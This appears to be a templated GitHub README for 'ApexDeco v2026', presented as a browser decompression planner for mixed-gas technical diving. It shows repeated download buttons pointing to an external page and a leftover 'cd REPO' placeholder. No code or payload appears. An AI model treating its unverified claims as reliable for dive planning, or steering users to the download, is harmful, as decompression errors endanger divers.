# ApexDeco v2026 - decompression planner 2026

> **ApexDeco is a browser-based technical-diving decompression planner for mixed-gas dive planning in 2026, built for open circuit and CCR workflows with Buhlmann, VPM, and gas tracking support.**

[![Platform](https://img.shields.io/badge/Platform-web%20browser-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v2026-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/leonireed3715/apexdeco-planner-2026?style=flat-square)](https://github.com/leonireed3715/apexdeco-planner-2026)

---

<p align="center">
  <a href="https://leonireed3715.github.io/apexdeco-planner-2026/">
    <img src="https://img.shields.io/badge/Download-ApexDeco%20Latest-brightgreen?style=for-the-badge" alt="Download ApexDeco">
  </a>
</p>

> **[Download ApexDeco v2026](https://leonireed3715.github.io/apexdeco-planner-2026/)**

---

[Download Latest Build](https://leonireed3715.github.io/apexdeco-planner-2026/)

---

## Overview

ApexDeco runs as a static web application and helps technical divers assemble and assess decompression plans directly in a browser. It handles profiles using trimix, nitrox, air, and other mixed gases, while offering planning modes for both open-circuit equipment and closed-circuit rebreathers.

The application combines decompression calculations, gas-use planning, and profile inspection in a single lightweight interface. It is intended for divers who need to construct schedules, inspect gas-switch behavior, and review exposure figures without installing a desktop program.

---

## Capabilities

- Runs as a static browser application without a desktop runtime
- Builds decompression plans for trimix, nitrox, and air
- Provides Buhlmann ZHL-16C calculations with gradient factors
- Includes VPM-A, VPM-B, VPM-B/E, and VPM-B/GFS options
- Supports both open-circuit and CCR planning
- Handles multi-level profiles with tissue carry-over
- Calculates gas consumption, OTU, and CNS values
- Supports bailout planning and checks gas-switch conditions
- Displays an interactive profile chart and supports plain-text export
- Cross-checks mathematical results against a native reference implementation

---

## Getting Started

ApexDeco is delivered as a browser project. Either clone the repository or obtain its files, then launch the application in a current web browser.

To create a local checkout:

    git clone https://github.com/leonireed3715/apexdeco-planner-2026.git
    cd REPO

Open the web app entry point directly, or use a static file server to host the directory locally.

---

## Planning a Dive

Select the dive category, breathing gas, and decompression model first. You can then assemble the profile, inspect the generated schedule, and refine values such as gradient factors or VPM settings.

A normal planning sequence is:

1. Set the equipment mode to open circuit or CCR.
2. Provide the planned depth, duration, and breathing gases.
3. Pick a decompression algorithm and its tuning parameters.
4. Inspect the profile graph and exposure calculations.
5. Check gas switches and bailout information.
6. Export the completed schedule as plain text.

The planner is designed for repeated adjustments, allowing changes to the profile to be reviewed immediately in the updated results.

---

## Configuration

Because ApexDeco is a static browser application, its operating options are exposed primarily through the planning interface rather than a separate runtime configuration file.

When running a local deployment, settings are normally changed in the application itself and retained according to the browser and hosting arrangement used for the session.

Example deployment-oriented settings:

    app:
      mode: static
      runtime: browser
      output: profile chart, plain-text export
      planning:
        model: Buhlmann ZHL-16C
        options: [GF, VPM-A, VPM-B, VPM-B/E, VPM-B/GFS]

---

## System Requirements

- A modern web browser
- JavaScript enabled
- Local storage or static hosting when running the application from a personal machine or server
- Enough display area to use the planning controls and read the profile chart comfortably

---

## Frequently Asked Questions

**How can I obtain a newer version?**  
Visit the repository or hosted build to check for the newest revision, then replace the local files when an updated version is available.

**Where does ApexDeco keep dive settings?**  
Settings are generally managed by the browser and the current planning session. The exact behavior depends on the hosting and usage setup.

**Why might the planner fail to load?**  
Use a current browser and verify that all project files were downloaded correctly or served in full.

**Is ApexDeco intended for technical-diving profiles?**  
Yes. It supports mixed-gas plans, open-circuit and CCR modes, tissue carry-over, gas validation, and exposure calculations.

**Can the finished plan be exported?**  
Yes. The application provides plain-text export and an interactive profile chart for reviewing the plan.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
